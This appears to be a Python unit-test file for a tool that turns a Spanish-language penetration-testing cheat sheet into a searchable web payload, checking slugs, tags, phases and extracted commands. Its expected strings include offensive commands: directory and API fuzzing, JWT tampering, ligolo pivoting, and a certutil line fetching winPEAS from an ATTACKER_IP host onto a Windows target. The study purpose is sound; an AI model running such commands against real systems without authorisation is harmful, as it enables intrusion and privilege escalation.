import unittest

from tools import export_web_content


class ExportWebContentTests(unittest.TestCase):
    def test_slugify_keeps_lookup_urls_stable(self):
        self.assertEqual(export_web_content.slugify("Windows local privilege escalation"), "windows-local-privilege-escalation")
        self.assertEqual(export_web_content.slugify("Web y APIs"), "web-y-apis")

    def test_normalize_sections_extracts_searchable_cards_and_commands(self):
        sections = [
            {
                "short": "Web y APIs",
                "summary": "De discovery web a bugs de autorizacion.",
                "blocks": [
                    ("p", "Busca rutas, sesiones y endpoints."),
                    ("code", ["ffuf -u http://$IP/FUZZ -w words.txt", "curl -i http://$IP"]),
                    ("table", [["Hallazgo", "Siguiente paso"], ["JWT", "Revisar alg y exp"]]),
                ],
            }
        ]

        payload = export_web_content.build_payload(sections)

        self.assertEqual(payload["stats"]["totalSections"], 1)
        self.assertEqual(payload["sections"][0]["slug"], "web-y-apis")
        self.assertIn("web", payload["sections"][0]["tags"])
        self.assertIn("ffuf -u http://$IP/FUZZ -w words.txt", payload["sections"][0]["commands"])
        self.assertIn("JWT Revisar alg y exp", payload["sections"][0]["searchText"])

    def test_payload_contains_decision_shortcuts_for_fast_entry(self):
        payload = export_web_content.build_payload(
            [
                {"short": "Checklist de atasco", "summary": "Preguntas para desbloquearse.", "blocks": []},
                {"short": "Credenciales y loot", "summary": "Buscar y reutilizar credenciales.", "blocks": []},
            ]
        )

        labels = [item["label"] for item in payload["shortcuts"]]

        self.assertIn("Estoy atascado", labels)
        self.assertIn("Tengo credenciales", labels)

    def test_load_source_sections_does_not_require_pdf_dependencies(self):
        sections = export_web_content.load_source_sections()

        self.assertGreaterEqual(len(sections), 10)
        self.assertEqual(sections[0]["short"], "Ultra quick start")

    def test_web_section_includes_gobuster_command_alternatives(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        web_section = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")

        commands = "\n".join(web_section["commands"])

        self.assertIn("gobuster dir", commands)
        self.assertIn("gobuster vhost", commands)

    def test_web_section_includes_fuzzing_command_alternatives(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())
        web_section = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")

        commands = "\n".join(web_section["commands"])

        self.assertIn("wfuzz -c", commands)
        self.assertIn("ffuf -u \"$URL/api/FUZZ\"", commands)
        self.assertIn("feroxbuster -u $URL", commands)

    def test_full_guide_commands_are_merged_into_existing_sections(self):
        payload = export_web_content.build_payload(export_web_content.load_source_sections())

        windows = next(section for section in payload["sections"] if section["slug"] == "windows-privesc")
        pivoting = next(section for section in payload["sections"] if section["slug"] == "pivoting")
        web = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")

        self.assertIn("certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe", windows["commands"])
        self.assertIn("sudo ip tuntap add user $USER mode tun ligolo", pivoting["commands"])
        self.assertIn("jwt_tool TOKEN", web["commands"])
        self.assertGreaterEqual(payload["stats"]["totalCommands"], 200)

    def test_phase_is_inferred_from_primary_topic_before_broad_tags(self):
        payload = export_web_content.build_payload(
            [
                {
                    "short": "Windows privesc",
                    "summary": "Post-exploit Windows fuera de AD.",
                    "blocks": [("p", "Servicios, registry, credenciales y winPEAS.")],
                },
                {
                    "short": "Pivoting",
                    "summary": "Cuando el target ve servicios que tu Kali no ve.",
                    "blocks": [("p", "chisel, ligolo y proxychains.")],
                },
            ]
        )

        phases = {section["title"]: section["phase"] for section in payload["sections"]}

        self.assertEqual(phases["Windows privesc"], "privesc")
        self.assertEqual(phases["Pivoting"], "pivot")

    def test_curated_tags_keep_filters_focused(self):
        payload = export_web_content.build_payload(
            [
                {"short": "Ultra quick start", "summary": "La hoja minima.", "blocks": [("p", "Menciona web, SMB y Windows como overview.")]},
                {"short": "Windows privesc", "summary": "Post-exploit Windows.", "blocks": [("p", "Servicios y registry.")]},
            ]
        )

        tags = {section["title"]: section["tags"] for section in payload["sections"]}

        self.assertEqual(tags["Ultra quick start"], ["recon", "workflow"])
        self.assertEqual(tags["Windows privesc"], ["windows"])


if __name__ == "__main__":
    unittest.main()
